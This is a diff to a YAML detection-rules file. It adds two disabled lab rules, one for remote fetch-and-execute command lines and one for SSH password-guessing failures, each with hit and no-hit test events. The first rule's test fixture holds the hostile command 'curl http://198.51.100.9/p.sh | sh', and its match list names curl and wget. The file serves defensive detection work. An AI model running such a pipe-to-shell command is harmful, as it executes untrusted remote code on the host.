@@ -258,3 +258,108 @@ rules:
           - {"event_type": "lateral_conn", "agent_id": "agent-1", "timestamp": "2026-06-01T00:00:00Z", "src_ip": "10.0.0.50", "dst_ip": "10.0.0.18", "dst_port": 22, "proto": "tcp", "extra": {"lateral_kind": "attempt", "lateral_confidence": 90}}
           - {"event_type": "lateral_conn", "agent_id": "agent-1", "timestamp": "2026-06-01T00:00:00Z", "src_ip": "10.0.0.50", "dst_ip": "10.0.0.19", "dst_port": 22, "proto": "tcp", "extra": {"lateral_kind": "attempt", "lateral_confidence": 90}}
           - {"event_type": "lateral_conn", "agent_id": "agent-1", "timestamp": "2026-06-01T00:00:00Z", "src_ip": "10.0.0.50", "dst_ip": "10.0.0.20", "dst_port": 22, "proto": "tcp", "extra": {"lateral_kind": "attempt", "lateral_confidence": 90}}
+
+  - schema_version: 2
+    id: v2_lab_proc_remote_fetch_exec_v1
+    name: "V2 Lab: Remote fetch-and-execute command line"
+    description: "Process execution whose command line fetches a remote payload and pipes it into a shell interpreter."
+    enabled: false
+    status: disabled
+    maturity: experimental
+    severity: high
+    confidence: 70
+    logsource:
+      source: proc_exec
+      event_type: proc_exec
+    attack:
+      tactic: execution
+      technique_id: T1059.004
+      technique: "Command and Scripting Interpreter: Unix Shell"
+      confidence: 70
+    detection:
+      selection:
+        event.type: proc_exec
+        process.command_line|contains:
+          - curl
+          - wget
+      condition: selection
+    aggregation:
+      type: threshold
+      window: 5m
+      group_by:
+        - agent.id
+      condition:
+        operator: ">="
+        value: 1
+      min_events: 1
+    suppression:
+      cooldown: 15m
+      rules: []
+    tuning: {}
+    response:
+      playbook: Inspect the full command line and the spawning parent process on the affected host.
+      false_positives: Provisioning or configuration-management tooling that legitimately downloads and runs setup scripts.
+    tests:
+      - id: remote_fetch_command_fires
+        description: "A proc_exec whose command line pipes curl output into sh triggers the rule."
+        expect: hit
+        events:
+          - {"event_type": "proc_exec", "agent_id": "agent-7", "timestamp": "2026-06-01T00:00:00Z", "extra": {"command": "curl http://198.51.100.9/p.sh | sh", "username": "www-data", "exe_name": "curl"}}
+      - id: benign_command_stays_quiet
+        description: "A routine command line without a remote fetch does not trigger the rule."
+        expect: no_hit
+        events:
+          - {"event_type": "proc_exec", "agent_id": "agent-7", "timestamp": "2026-06-01T00:00:00Z", "extra": {"command": "ls -la /var/www", "username": "www-data", "exe_name": "ls"}}
+
+  - schema_version: 2
+    id: v2_lab_ssh_auth_action_v1
+    name: "V2 Lab: SSH auth failure action"
+    description: "SSH authentication event whose raw action field indicates a failed credential attempt."
+    enabled: false
+    status: disabled
+    maturity: experimental
+    severity: low
+    confidence: 60
+    logsource:
+      source: ssh_auth
+      event_type: ssh_auth
+    attack:
+      tactic: credential_access
+      technique_id: T1110.001
+      technique: "Brute Force: Password Guessing"
+      confidence: 60
+    detection:
+      selection:
+        event.type: ssh_auth
+        ssh.auth.action|in:
+          - failed_password
+          - invalid_user
+      condition: selection
+    aggregation:
+      type: threshold
+      window: 5m
+      group_by:
+        - source.ip
+        - destination.ip
+      condition:
+        operator: ">="
+        value: 1
+      min_events: 1
+    suppression:
+      cooldown: 15m
+      rules: []
+    tuning: {}
+    response:
+      playbook: Correlate the source IP against authentication failures observed across other hosts.
+      false_positives: Users mistyping passwords or expired automation credentials retrying briefly.
+    tests:
+      - id: failed_action_fires
+        description: "An ssh_auth event whose extra.action is failed_password triggers the rule."
+        expect: hit
+        events:
+          - {"event_type": "ssh_auth", "agent_id": "agent-3", "timestamp": "2026-06-01T00:00:00Z", "src_ip": "203.0.113.20", "dst_ip": "10.0.0.5", "dst_port": 22, "extra": {"source": "auth.log", "action": "failed_password", "username": "root", "src_port": 51000}}
+      - id: accepted_action_stays_quiet
+        description: "A successful ssh_auth event does not trigger the failure rule."
+        expect: no_hit
+        events:
+          - {"event_type": "ssh_auth", "agent_id": "agent-3", "timestamp": "2026-06-01T00:00:00Z", "src_ip": "203.0.113.20", "dst_ip": "10.0.0.5", "dst_port": 22, "extra": {"source": "auth.log", "action": "accepted_password", "username": "root", "src_port": 51000}}
